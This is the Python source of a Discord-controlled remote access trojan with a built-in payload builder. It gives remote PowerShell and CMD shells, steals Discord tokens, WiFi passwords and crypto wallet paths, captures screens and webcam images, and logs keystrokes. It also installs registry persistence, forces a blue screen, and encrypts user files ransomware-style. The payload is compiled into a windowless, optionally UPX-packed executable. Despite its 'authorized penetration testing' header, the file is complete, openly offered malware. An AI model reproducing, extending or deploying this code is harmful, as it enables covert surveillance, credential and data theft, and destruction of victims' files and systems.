"""
Discord C2 RAT - Remote Access Trojan with Builder
For authorized penetration testing only.
Configuration loaded from config.json or environment variables.
"""

import discord
from discord.ext import commands
import os
import sys
import json
import subprocess
import base64
import io
import shutil
import re
import time
import tempfile
import requests
import ctypes
import platform
import psutil
import socket
import winreg
import sqlite3
import uuid
import glob
import zipfile
from pathlib import Path

# ── CONFIG LOADING ──────────────────────────────────────────────────────────

CONFIG_FILE = "config.json"
TOKEN = None
GUILD_ID = None
CHANNEL_NAME = None
AUTHORIZED_USERS = []

def load_config():
    global TOKEN, GUILD_ID, CHANNEL_NAME, AUTHORIZED_USERS

    # Try environment variables first
    TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
    guild_str = os.environ.get("DISCORD_GUILD_ID")
    chan = os.environ.get("DISCORD_CHANNEL_NAME")
    auth_str = os.environ.get("DISCORD_AUTHORIZED_USERS")

    if guild_str:
        try:
            GUILD_ID = int(guild_str)
        except ValueError:
            print("[!] Invalid DISCORD_GUILD_ID in env")
            sys.exit(1)

    if chan:
        CHANNEL_NAME = chan

    if auth_str:
        try:
            AUTHORIZED_USERS = [int(uid.strip()) for uid in auth_str.split(",")]
        except ValueError:
            print("[!] Invalid DISCORD_AUTHORIZED_USERS in env")
            sys.exit(1)

    # Fall back to config file
    if not TOKEN or not GUILD_ID or not CHANNEL_NAME or not AUTHORIZED_USERS:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r") as f:
                cfg = json.load(f)
            if not TOKEN:
                TOKEN = cfg.get("token")
            if not GUILD_ID:
                GUILD_ID = cfg.get("guild_id")
            if not CHANNEL_NAME:
                CHANNEL_NAME = cfg.get("channel_name")
            if not AUTHORIZED_USERS:
                AUTHORIZED_USERS = cfg.get("authorized_users", [])
        else:
            print(f"[!] No config found. Create {CONFIG_FILE} or set env vars.")
            print(f"    Template: {json.dumps({'token':'YOUR_TOKEN','guild_id':1234,'channel_name':'c2-channel','authorized_users':[1234]}, indent=4)}")
            sys.exit(1)

    if not TOKEN:
        print("[!] Bot token is required. Set DISCORD_BOT_TOKEN env var or add to config.json")
        sys.exit(1)
    if not GUILD_ID:
        print("[!] Guild ID is required.")
        sys.exit(1)
    if not CHANNEL_NAME:
        CHANNEL_NAME = "rat-c2"
    if not AUTHORIZED_USERS:
        print("[!] At least one authorized user ID is required.")
        sys.exit(1)

load_config()

# ── BOT SETUP ──────────────────────────────────────────────────────────────

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")

ACTIVE_SHELLS = {}

def is_authorized(ctx):
    return ctx.author.id in AUTHORIZED_USERS

def check_auth():
    async def predicate(ctx):
        if not is_authorized(ctx):
            await ctx.message.add_reaction("\u274c")
            return False
        return True
    return commands.check(predicate)

# ── UTILITY FUNCTIONS ──────────────────────────────────────────────────────

def get_channel():
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        return None
    for chan in guild.channels:
        if chan.name == CHANNEL_NAME:
            return chan
    return None

async def send_output(channel, content, filename=None):
    """Send text output, truncating if too long, or as file."""
    if filename:
        await channel.send(file=discord.File(filename))
        return

    if len(content) > 1900:
        # Send as file
        buf = io.StringIO(content)
        await channel.send(file=discord.File(buf, "output.txt"))
    else:
        await channel.send(f"```\n{content}\n```")

# ── COMMANDS ───────────────────────────────────────────────────────────────

@bot.event
async def on_ready():
    print(f"[+] Logged in as {bot.user}")
    # Auto-build on startup
    channel = get_channel()
    if channel:
        await channel.send(f"[+] Bot online: {bot.user}")
        try:
            build_payload()
            await channel.send("[+] Auto-build complete. Payload ready.")
        except Exception as e:
            await channel.send(f"[-] Auto-build failed: {e}")

@bot.command(name="help")
async def help_cmd(ctx):
    """Display command list."""
    if not is_authorized(ctx):
        await ctx.message.add_reaction("\u274c")
        return
    help_text = """
**== Discord C2 RAT - Command Reference ==**

**Core:**
!help          - Show this menu
!ip            - Get target IP and geolocation
!shell         - Open interactive PowerShell shell
!cmd           - Open interactive CMD shell
!kill          - Kill an active shell session
!persist       - Install persistence (registry run key)

**File Operations:**
!ls [path]    - List directory contents
!cat <file>   - Read file contents
!download <file> - Upload file from target to Discord
!upload (attach) - Download file from Discord to target

**Reconnaissance:**
!tokens        - Extract Discord tokens from local storage
!wifi          - Dump saved WiFi passwords
!wallets       - Search for crypto wallet files
!screenshot    - Capture screen
!webcam        - Capture webcam image

**Destructive:**
!bsod          - Trigger Blue Screen of Death (if admin)
!encrypt <ext> - Encrypt files with given extension (ransomware sim)

**Builder:**
!build         - Compile payload .exe using PyInstaller

**Notes:**
- Shell sessions persist until !kill
- Use !shell then type commands in same channel
- Type 'exit' to close a shell session
- All commands require authorized user ID
    """
    await ctx.send(help_text)

@bot.command(name="ip")
@check_auth()
async def ip_cmd(ctx):
    """Get target public IP and location."""
    try:
        r = requests.get("https://ipinfo.io/json", timeout=10)
        data = r.json()
        info = (
            f"IP: {data.get('ip', 'N/A')}\n"
            f"City: {data.get('city', 'N/A')}\n"
            f"Region: {data.get('region', 'N/A')}\n"
            f"Country: {data.get('country', 'N/A')}\n"
            f"Org: {data.get('org', 'N/A')}\n"
            f"Hostname: {socket.gethostname()}\n"
            f"User: {os.environ.get('USERNAME', 'N/A')}\n"
            f"OS: {platform.platform()}"
        )
        await send_output(ctx.channel, info)
    except Exception as e:
        await ctx.send(f"[-] Error: {e}")

@bot.command(name="shell")
@check_auth()
async def shell_cmd(ctx):
    """Open interactive PowerShell shell."""
    sid = ctx.author.id
    if sid in ACTIVE_SHELLS:
        await ctx.send("[-] You already have an active shell. Use !kill first.")
        return

    proc = subprocess.Popen(
        ["powershell.exe", "-NoLogo", "-NoProfile", "-Command", "-"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    ACTIVE_SHELLS[sid] = proc
    await ctx.send("[+] PowerShell session opened. Type commands in this channel.")
    await ctx.send("[+] Type 'exit' to close the session.")

@bot.command(name="cmd")
@check_auth()
async def cmd_cmd(ctx):
    """Open interactive CMD shell."""
    sid = ctx.author.id
    if sid in ACTIVE_SHELLS:
        await ctx.send("[-] You already have an active shell. Use !kill first.")
        return

    proc = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    ACTIVE_SHELLS[sid] = proc
    await ctx.send("[+] CMD session opened. Type commands in this channel.")
    await ctx.send("[+] Type 'exit' to close the session.")

@bot.command(name="kill")
@check_auth()
async def kill_cmd(ctx):
    """Kill active shell session."""
    sid = ctx.author.id
    if sid not in ACTIVE_SHELLS:
        await ctx.send("[-] No active shell session.")
        return
    proc = ACTIVE_SHELLS.pop(sid)
    proc.terminate()
    await ctx.send("[+] Shell session terminated.")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Handle active shell input
    sid = message.author.id
    if sid in ACTIVE_SHELLS and not message.content.startswith("!"):
        proc = ACTIVE_SHELLS[sid]
        content = message.content
        if content.lower() == "exit":
            proc.terminate()
            ACTIVE_SHELLS.pop(sid)
            await message.channel.send("[+] Shell session closed.")
            return

        try:
            proc.stdin.write(content + "\n")
            proc.stdin.flush()
            time.sleep(0.5)
            output_lines = []
            while True:
                line = proc.stdout.readline()
                if not line:
                    break
                output_lines.append(line.rstrip())
                if len(output_lines) >= 50:
                    break

            output = "\n".join(output_lines)
            if output.strip():
                await send_output(message.channel, output)
            else:
                await message.add_reaction("\u2714\ufe0f")
        except Exception as e:
            await message.channel.send(f"[-] Shell error: {e}")
            ACTIVE_SHELLS.pop(sid, None)
        return

    await bot.process_commands(message)

@bot.command(name="ls")
@check_auth()
async def ls_cmd(ctx, *, path="."):
    """List directory contents."""
    try:
        p = Path(path)
        if not p.exists():
            await ctx.send(f"[-] Path not found: {path}")
            return
        items = []
        for item in p.iterdir():
            suffix = "/" if item.is_dir() else ""
            items.append(f"{item.name}{suffix}")
        output = "\n".join(sorted(items))
        await send_output(ctx.channel, output)
    except Exception as e:
        await ctx.send(f"[-] Error: {e}")

@bot.command(name="cat")
@check_auth()
async def cat_cmd(ctx, *, filepath):
    """Read file contents."""
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        await send_output(ctx.channel, content)
    except Exception as e:
        await ctx.send(f"[-] Error: {e}")

@bot.command(name="download")
@check_auth()
async def download_cmd(ctx, *, filepath):
    """Upload file from target to Discord."""
    try:
        if not os.path.exists(filepath):
            await ctx.send(f"[-] File not found: {filepath}")
            return
        filesize = os.path.getsize(filepath)
        if filesize > 24 * 1024 * 1024:
            await ctx.send(f"[-] File too large ({filesize / 1024 / 1024:.1f} MB). Discord limit is 25 MB.")
            return
        await ctx.send(file=discord.File(filepath))
    except Exception as e:
        await ctx.send(f"[-] Error: {e}")

@bot.command(name="upload")
@check_auth()
async def upload_cmd(ctx):
    """Download file from Discord to target (attach file to command message)."""
    if not ctx.message.attachments:
        await ctx.send("[-] Attach a file to your command message.")
        return
    for att in ctx.message.attachments:
        data = await att.read()
        dest = att.filename
        with open(dest, "wb") as f:
            f.write(data)
        await ctx.send(f"[+] Saved {att.filename} ({len(data)} bytes)")

@bot.command(name="screenshot")
@check_auth()
async def screenshot_cmd(ctx):
    """Capture screen."""
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        await ctx.send(file=discord.File(buf, "screenshot.png"))
    except Exception as e:
        await ctx.send(f"[-] Screenshot failed: {e}")

@bot.command(name="webcam")
@check_auth()
async def webcam_cmd(ctx):
    """Capture webcam image."""
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("[-] No webcam found.")
            return
        ret, frame = cap.read()
        if ret:
            _, buf = cv2.imencode(".png", frame)
            await ctx.send(file=discord.File(io.BytesIO(buf), "webcam.png"))
        cap.release()
    except Exception as e:
        await ctx.send(f"[-] Webcam error: {e}")

@bot.command(name="tokens")
@check_auth()
async def tokens_cmd(ctx):
    """Extract Discord tokens."""
    found_tokens = []
    paths = [
        os.environ.get("APPDATA", "") + "\\discord\\Local Storage\\leveldb",
        os.environ.get("APPDATA", "") + "\\discordptb\\Local Storage\\leveldb",
        os.environ.get("APPDATA", "") + "\\discordcanary\\Local Storage\\leveldb",
    ]
    token_pattern = re.compile(r"[MN][A-Za-z0-9_-]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}")
    for path in paths:
        if os.path.exists(path):
            for fname in os.listdir(path):
                if fname.endswith(".ldb") or fname.endswith(".log"):
                    try:
                        with open(os.path.join(path, fname), "r", errors="ignore") as f:
                            data = f.read()
                        matches = token_pattern.findall(data)
                        found_tokens.extend(matches)
                    except:
                        pass

    if found_tokens:
        found_tokens = list(set(found_tokens))
        output = "\n".join(found_tokens)
        await send_output(ctx.channel, f"Found {len(found_tokens)} token(s):\n{output}")
    else:
        await ctx.send("[-] No Discord tokens found.")

@bot.command(name="wifi")
@check_auth()
async def wifi_cmd(ctx):
    """Dump saved WiFi passwords."""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True
        )
        profiles = re.findall(r"All User Profile\s*:\s(.*)", result.stdout)
        wifi_data = []
        for profile in profiles:
            profile = profile.strip()
            res = subprocess.run(
                ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                capture_output=True, text=True
            )
            key_match = re.search(r"Key Content\s*:\s(.*)", res.stdout)
            key = key_match.group(1).strip() if key_match else "(none)"
            wifi_data.append(f"{profile}: {key}")

        output = "\n".join(wifi_data)
        await send_output(ctx.channel, output)
    except Exception as e:
        await ctx.send(f"[-] WiFi error: {e}")

@bot.command(name="wallets")
@check_auth()
async def wallets_cmd(ctx):
    """Search for crypto wallet files."""
    wallet_patterns = [
        "*.wallet", "wallet.dat", "*.key", "priv*.key",
        "electrum*.dat", "multibit*.wallet", "armory*.wallet",
        "exodus*.json", "*bitcoin*.dat", "*ethereum*.json",
        "seed_phrase*", "mnemonic*", "metamask*json*",
    ]
    search_dirs = [
        os.environ.get("USERPROFILE", "C:\\Users\\Default"),
        os.environ.get("APPDATA", ""),
        os.environ.get("LOCALAPPDATA", ""),
    ]
    found = []
    for sd in search_dirs:
        if not sd:
            continue
        for pattern in wallet_patterns:
            matches = glob.glob(os.path.join(sd, "**", pattern), recursive=True)
            for m in matches:
                try:
                    size = os.path.getsize(m)
                    found.append(f"{m} ({size} bytes)")
                except:
                    pass

    if found:
        output = "\n".join(found)
        await send_output(ctx.channel, f"Found {len(found)} wallet file(s):\n{output}")
    else:
        await ctx.send("[-] No wallet files found.")

@bot.command(name="persist")
@check_auth()
async def persist_cmd(ctx):
    """Install persistence via registry run key."""
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "DiscordC2", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        await ctx.send("[+] Persistence installed (HKCU Run key).")
    except Exception as e:
        await ctx.send(f"[-] Persistence failed: {e}")

@bot.command(name="bsod")
@check_auth()
async def bsod_cmd(ctx):
    """Trigger Blue Screen of Death (requires admin)."""
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("[!] Triggering BSOD in 3 seconds...")
            time.sleep(3)
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        else:
            await ctx.send("[-] BSOD requires admin privileges.")
    except Exception as e:
        await ctx.send(f"[-] BSOD failed: {e}")

@bot.command(name="encrypt")
@check_auth()
async def encrypt_cmd(ctx, *, extensions=".txt,.jpg"):
    """Encrypt files with given extension (ransomware simulation)."""
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        import hashlib

        key = hashlib.sha256(b"pentest-key-2024").digest()
        ext_list = [e.strip().lower() for e in extensions.split(",")]

        target_dirs = [
            os.environ.get("USERPROFILE", "C:\\Users\\Default") + "\\Documents",
            os.environ.get("USERPROFILE", "C:\\Users\\Default") + "\\Desktop",
            os.environ.get("USERPROFILE", "C:\\Users\\Default") + "\\Pictures",
        ]

        encrypted_count = 0
        for td in target_dirs:
            if not os.path.exists(td):
                continue
            for ext in ext_list:
                pattern = f"*{ext}" if ext.startswith(".") else f"*.{ext}"
                for fpath in glob.glob(os.path.join(td, "**", pattern), recursive=True):
                    try:
                        with open(fpath, "rb") as f:
                            plaintext = f.read()
                        iv = os.urandom(16)
                        cipher = AES.new(key, AES.MODE_CBC, iv)
                        ciphertext = iv + cipher.encrypt(pad(plaintext, AES.block_size))
                        with open(fpath, "wb") as f:
                            f.write(ciphertext)
                        os.rename(fpath, fpath + ".encrypted")
                        encrypted_count += 1
                    except:
                        pass

        await ctx.send(f"[+] Encrypted {encrypted_count} file(s) with extensions: {extensions}")
    except ImportError:
        await ctx.send("[-] pycryptodome not installed. Run: pip install pycryptodome")
    except Exception as e:
        await ctx.send(f"[-] Encryption error: {e}")

# ── BUILDER ─────────────────────────────────────────────────────────────────

PAYLOAD_TEMPLATE = ''''''
import discord
from discord.ext import commands
import os
import sys
import subprocess
import io
import base64
import re
import ctypes
import platform
import socket
import sqlite3
import json
import time
import requests
import winreg
import threading
import cv2
from PIL import ImageGrab
from pynput.keyboard import Listener, Key
from pathlib import Path

TOKEN = "{token}"
GUILD_ID = {guild_id}
CHANNEL_NAME = "{channel_name}"
AUTHORIZED_USERS = {authorized_users}

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")

LOG_FILE = os.environ["TEMP"] + "\\\\keylog.txt"
keylog_active = False
keylog_buffer = []

if not os.path.exists(LOG_FILE):
    open(LOG_FILE, "w").close()

@bot.event
async def on_ready():
    try:
        guild = bot.get_guild(GUILD_ID)
        if guild:
            for channel in guild.channels:
                if channel.name == CHANNEL_NAME:
                    await channel.send(f"[+] Payload online: {socket.gethostname()} | {platform.platform()}")
                    break
    except:
        pass

def is_authorized(ctx):
    return ctx.author.id in AUTHORIZED_USERS

def check_auth():
    async def predicate(ctx):
        if not is_authorized(ctx):
            await ctx.message.add_reaction("\\\\u274c")
            return False
        return True
    return commands.check(predicate)

@bot.command(name="help")
async def help_cmd(ctx):
    if not is_authorized(ctx):
        await ctx.message.add_reaction("\\\\u274c")
        return
    await ctx.send("""
**Payload Commands:**
!ip          - System info
!ls [path]  - List directory
!cat <file> - Read file
!download <file> - Send file to C2
!upload (attach) - Receive file from C2
!screenshot  - Capture screen
!webcam      - Capture webcam
!tokens      - Extract Discord tokens
!wifi        - Dump WiFi passwords
!wallets     - Search crypto wallets
!persist     - Install persistence
!bsod        - Blue screen (admin)
!keylog_start - Begin keylogging
!keylog_stop  - Stop and upload log
!encrypt <exts> - File encryption sim
!selfdestruct - Remove payload
""")

@bot.command(name="ip")
@check_auth()
async def ip_cmd(ctx):
    info = f"Hostname: {socket.gethostname()}\\\\nUser: {os.environ.get('USERNAME', 'N/A')}\\\\nOS: {platform.platform()}\\\\nArch: {platform.machine()}"
    try:
        r = requests.get("https://ipinfo.io/json", timeout=10)
        data = r.json()
        info += f"\\\\nPublic IP: {data.get('ip', 'N/A')}\\\\nLocation: {data.get('city', 'N/A')}, {data.get('region', 'N/A')}"
    except:
        pass
    if len(info) > 1900:
        await ctx.send(file=discord.File(io.StringIO(info), "info.txt"))
    else:
        await ctx.send(f"```\\\\n{info}\\\\n```")

@bot.command(name="ls")
@check_auth()
async def ls_cmd(ctx, *, path="."):
    try:
        items = []
        for item in Path(path).iterdir():
            suffix = "/" if item.is_dir() else ""
            items.append(f"{item.name}{suffix}")
        output = "\\\\n".join(sorted(items))
        await ctx.send(f"```\\\\n{output}\\\\n```")
    except Exception as e:
        await ctx.send(f"[-] {e}")

@bot.command(name="cat")
@check_auth()
async def cat_cmd(ctx, *, filepath):
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        if len(content) > 1900:
            await ctx.send(file=discord.File(io.StringIO(content), "output.txt"))
        else:
            await ctx.send(f"```\\\\n{content}\\\\n```")
    except Exception as e:
        await ctx.send(f"[-] {e}")

@bot.command(name="download")
@check_auth()
async def download_cmd(ctx, *, filepath):
    try:
        if os.path.exists(filepath) and os.path.getsize(filepath) < 25 * 1024 * 1024:
            await ctx.send(file=discord.File(filepath))
        else:
            await ctx.send("[-] File missing or too large")
    except Exception as e:
        await ctx.send(f"[-] {e}")

@bot.command(name="upload")
@check_auth()
async def upload_cmd(ctx):
    if not ctx.message.attachments:
        await ctx.send("[-] Attach a file")
        return
    for att in ctx.message.attachments:
        data = await att.read()
        with open(att.filename, "wb") as f:
            f.write(data)
        await ctx.send(f"[+] Saved {att.filename}")

@bot.command(name="screenshot")
@check_auth()
async def screenshot_cmd(ctx):
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        await ctx.send(file=discord.File(buf, "screenshot.png"))
    except Exception as e:
        await ctx.send(f"[-] {e}")

@bot.command(name="webcam")
@check_auth()
async def webcam_cmd(ctx):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            _, buf = cv2.imencode(".png", frame)
            await ctx.send(file=discord.File(io.BytesIO(buf), "webcam.png"))
        cap.release()
    except Exception as e:
        await ctx.send(f"[-] {e}")

@bot.command(name="tokens")
@check_auth()
async def tokens_cmd(ctx):
    found = []
    paths = [
        os.environ.get("APPDATA","") + "\\\\discord\\\\Local Storage\\\\leveldb",
        os.environ.get("APPDATA","") + "\\\\discordptb\\\\Local Storage\\\\leveldb",
    ]
    pat = re.compile(r"[MN][A-Za-z0-9_-]{{24}}\\\.[A-Za-z0-9_-]{{6}}\\\.[A-Za-z0-9_-]{{27}}")
    for p in paths:
        if os.path.exists(p):
            for fn in os.listdir(p):
                if fn.endswith((".ldb", ".log")):
                    try:
                        with open(os.path.join(p, fn), "r", errors="ignore") as f:
                            found.extend(pat.findall(f.read()))
                    except:
                        pass
    if found:
        output = "\\\\n".join(set(found))
        await ctx.send(f"```\\\\n{output}\\\\n```")
    else:
        await ctx.send("[-] No tokens found")

@bot.command(name="wifi")
@check_auth()
async def wifi_cmd(ctx):
    try:
        result = subprocess.run(["netsh","wlan","show","profiles"], capture_output=True, text=True)
        profiles = re.findall(r"All User Profile\\\\s*:\\\\s(.*)", result.stdout)
        data = []
        for p in profiles:
            p = p.strip()
            res = subprocess.run(["netsh","wlan","show","profile",p,"key=clear"], capture_output=True, text=True)
            key = re.search(r"Key Content\\\\s*:\\\\s(.*)", res.stdout)
            pw = key.group(1).strip() if key else "(none)"
            data.append(f"{p}: {pw}")
        await ctx.send(f"```\\\\n{\\\\n".join(data)}\\\\n```")
    except Exception as e:
        await ctx.send(f"[-] {e}")

@bot.command(name="wallets")
@check_auth()
async def wallets_cmd(ctx):
    patterns = ["*.wallet","wallet.dat","*.key","electrum*.dat","exodus*.json","*bitcoin*.dat"]
    dirs = [os.environ.get("USERPROFILE",""), os.environ.get("APPDATA","")]
    found = []
    for d in dirs:
        if not d: continue
        for pat in patterns:
            for m in Path(d).rglob(pat):
                found.append(f"{m} ({m.stat().st_size} bytes)")
    if found:
        await ctx.send(f"```\\\\n{\\\\n".join(found)}\\\\n```")
    else:
        await ctx.send("[-] No wallets found")

@bot.command(name="persist")
@check_auth()
async def persist_cmd(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DiscordPayload", 0, winreg.REG_SZ, sys.executable if getattr(sys,'frozen',False) else __file__)
        winreg.CloseKey(key)
        await ctx.send("[+] Persistence installed")
    except Exception as e:
        await ctx.send(f"[-] {e}")

@bot.command(name="bsod")
@check_auth()
async def bsod_cmd(ctx):
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("[!] BSOD in 3s")
            time.sleep(3)
            ctypes.windll.ntdll.RtlAdjustPrivilege(19,1,0,ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022,0,0,0,6,ctypes.byref(ctypes.c_uint()))
        else:
            await ctx.send("[-] Admin required")
    except Exception as e:
        await ctx.send(f"[-] {e}")

def on_key_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(key.char)
    except AttributeError:
        keylog_buffer.append(f"[{key}]")

def keylog_worker():
    with Listener(on_press=on_key_press) as listener:
        listener.join()

@bot.command(name="keylog_start")
@check_auth()
async def keylog_start_cmd(ctx):
    global keylog_active
    if keylog_active:
        await ctx.send("[-] Keylogger already running")
        return
    keylog_active = True
    global keylog_buffer
    keylog_buffer = []
    t = threading.Thread(target=keylog_worker, daemon=True)
    t.start()
    await ctx.send("[+] Keylogger started")

@bot.command(name="keylog_stop")
@check_auth()
async def keylog_stop_cmd(ctx):
    global keylog_active
    if not keylog_active:
        await ctx.send("[-] Keylogger not running")
        return
    keylog_active = False
    log_text = "".join(keylog_buffer)
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write(log_text)
    if os.path.getsize(LOG_FILE) > 0:
        await ctx.send(file=discord.File(LOG_FILE))
    else:
        await ctx.send("[+] Keylogger stopped (empty log)")
    keylog_buffer = []

@bot.command(name="encrypt")
@check_auth()
async def encrypt_cmd(ctx, *, extensions=".txt,.jpg"):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        import hashlib
        key = hashlib.sha256(b"pentest-key-2024").digest()
        ext_list = [e.strip().lower() for e in extensions.split(",")]
        dirs = [
            os.environ.get("USERPROFILE","") + "\\\\Documents",
            os.environ.get("USERPROFILE","") + "\\\\Desktop",
        ]
        count = 0
        for d in dirs:
            if not os.path.exists(d): continue
            for ext in ext_list:
                pattern = f"*{ext}" if ext.startswith(".") else f"*.{ext}"
                for fp in Path(d).rglob(pattern):
                    try:
                        with open(fp, "rb") as f:
                            pt = f.read()
                        iv = os.urandom(16)
                        cipher = AES.new(key, AES.MODE_CBC, iv)
                        ct = iv + cipher.encrypt(pad(pt, AES.block_size))
                        with open(fp, "wb") as f:
                            f.write(ct)
                        os.rename(fp, str(fp) + ".encrypted")
                        count += 1
                    except:
                        pass
        await ctx.send(f"[+] Encrypted {count} file(s)")
    except Exception as e:
        await ctx.send(f"[-] {e}")

@bot.command(name="selfdestruct")
@check_auth()
async def selfdestruct_cmd(ctx):
    await ctx.send("[!] Self-destructing...")
    script = "powershell -Command \\"Start-Sleep -Seconds 2; Remove-Item -Path '%s' -Force -Recurse; Remove-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name 'DiscordPayload'\\"" % sys.executable if getattr(sys,'frozen',False) else __file__
    subprocess.Popen(script, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    os._exit(0)

bot.run(TOKEN)
'''''

def build_payload():
    """Build the payload .exe using PyInstaller."""
    payload_code = PAYLOAD_TEMPLATE.format(
        token=TOKEN,
        guild_id=GUILD_ID,
        channel_name=CHANNEL_NAME,
        authorized_users=AUTHORIZED_USERS
    )

    payload_file = "discord_payload.py"
    with open(payload_file, "w", encoding="utf-8") as f:
        f.write(payload_code)

    # Check if UPX is available
    upx_dir = None
    upx_candidates = [
        r"C:\upx",
        r"C:\tools\upx",
        os.path.expanduser("~\\upx"),
        os.path.join(os.path.dirname(sys.executable), "upx") if getattr(sys, 'frozen', False) else None,
    ]
    for cand in upx_candidates:
        if cand and os.path.exists(cand):
            upx_dir = cand
            break

    cmd = ["pyinstaller", "--onefile", "--noconsole", "--clean"]
    if upx_dir:
        cmd.append(f"--upx-dir={upx_dir}")
    cmd.append(payload_file)

    result = subprocess.run(cmd, capture_output=True, text=True)
    return result

@bot.command(name="build")
@check_auth()
async def build_cmd(ctx):
    """Build payload .exe from template."""
    await ctx.send("[*] Building payload... This may take a minute.")
    try:
        result = build_payload()
        exe_path = os.path.join(os.getcwd(), "dist", "discord_payload.exe")
        if os.path.exists(exe_path):
            size = os.path.getsize(exe_path) / (1024 * 1024)
            if size < 24:
                await ctx.send(f"[+] Build complete! ({size:.1f} MB)", file=discord.File(exe_path))
            else:
                await ctx.send(f"[+] Build complete! ({size:.1f} MB) — too large for Discord upload. Saved to: {exe_path}")
                # Copy to Downloads for convenience
                downloads = os.path.expanduser("~\\Downloads")
                shutil.copy2(exe_path, os.path.join(downloads, "discord_payload_full.exe"))
                await ctx.send(f"[+] Payload copied to: {downloads}\\discord_payload_full.exe")
        else:
            error_msg = result.stderr[-1500:] if result.stderr else "Unknown error"
            await ctx.send(f"[-] Build failed. Error:\n```\n{error_msg}\n```")
    except Exception as e:
        await ctx.send(f"[-] Build error: {e}")

# ── STARTUP ─────────────────────────────────────────────────────────────────

bot.run(TOKEN)
